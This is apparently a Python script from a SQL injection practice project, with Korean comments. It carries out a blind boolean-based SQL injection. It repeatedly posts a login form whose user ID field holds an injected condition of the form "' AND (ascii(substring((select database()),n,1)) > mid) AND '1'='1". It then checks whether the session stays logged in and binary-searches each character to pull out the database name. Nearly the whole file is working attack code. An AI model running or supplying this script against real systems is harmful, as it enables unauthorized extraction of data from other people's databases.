import requests;
from Sql_Injection.global_v import *;


def database():
    s=1;#  첫번째 자리부터
    start = 32; #공백부터(ascii = space)
    end = 126; #~까지(ascii = ~ )
    value = "";
    while True:
        
        mid=int((start+end)/2)#이진 탐색으로 중간값 찾기
        

        data = data = {"userid" : uid + db_query.format(s,0),#url의payload   
                    #' uid AND (ascii(substring((select database()),}s,1)) > 0) AND '1' = '1'
            "userpw" : ""};#먼저 아스키코드가 0을 반환 하는지 확인
        session = requests.session();#로그인 확인을 해야하므로 세션을 생성 한다.
        response = session.post(url,data)#post 방식으로 url에 데이터를 보냄
        check = session.get(check_url)#session 이 열려 있으므로 위의 결과가 로그인이 성공 했다면 세션이 유지되어 로그인결과를 알수 있음
        
        if false in check.text:#0보다 큰게 거짓이면 NULL값이므로 종료한다
            session.close();
            break;
        else:
            session.close()#계속 로그인을 반복 해야하기때문에 세션을 종료 했다 다시 시작하기를 반복한다.
            data = data = {"userid" : uid + db_query.format(s,mid),#url의payload   
                    #' uid AND (ascii(substring((select database()),}s,1)) > mid) AND '1' = '1'
            "userpw" : ""};
            session = requests.session();
            response = session.post(url,data)
            check = session.get(check_url)

            if false in check.text:
                end = mid;
                session.close();
            else:  
                start = mid;
                session.close();
            
            if start+1 >= end :
                value += chr(end);
                s+=1;
                start = 32
                end = 126
                session.close()
    return value;











